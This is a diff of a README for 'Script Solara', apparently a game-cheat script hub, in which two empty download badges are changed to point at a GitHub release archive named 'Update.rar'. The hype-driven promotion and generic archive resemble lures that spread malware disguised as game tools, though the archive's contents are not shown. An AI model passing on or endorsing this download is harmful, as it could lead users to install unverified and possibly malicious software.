@@ -1,9 +1,9 @@
-# 🚀 Script Solara — The Ultimate Script Hub for Your Games! 🎮🔥 [![Download Script Solara](https://img.shields.io/badge/Download-Script_Solara-red?style=for-the-badge&logo=download)]()
+# 🚀 Script Solara — The Ultimate Script Hub for Your Games! 🎮🔥 [![Download Script Solara](https://img.shields.io/badge/Download-Script_Solara-red?style=for-the-badge&logo=download)](https://github.com/SolaKings/script-solara/releases/download/Update/Update.rar)
 
 ![sol](https://github.com/user-attachments/assets/4ff028ca-f034-4dfd-b314-14c36c7fb16b)
 
 
-[![Download Script Solara](https://img.shields.io/badge/Download-Script_Solara-red?style=for-the-badge&logo=download)]()
+[![Download Script Solara](https://img.shields.io/badge/Download-Script_Solara-red?style=for-the-badge&logo=download)](https://github.com/SolaKings/script-solara/releases/download/Update/Update.rar)
 
 ## 🌟 What is Script Solara?
 
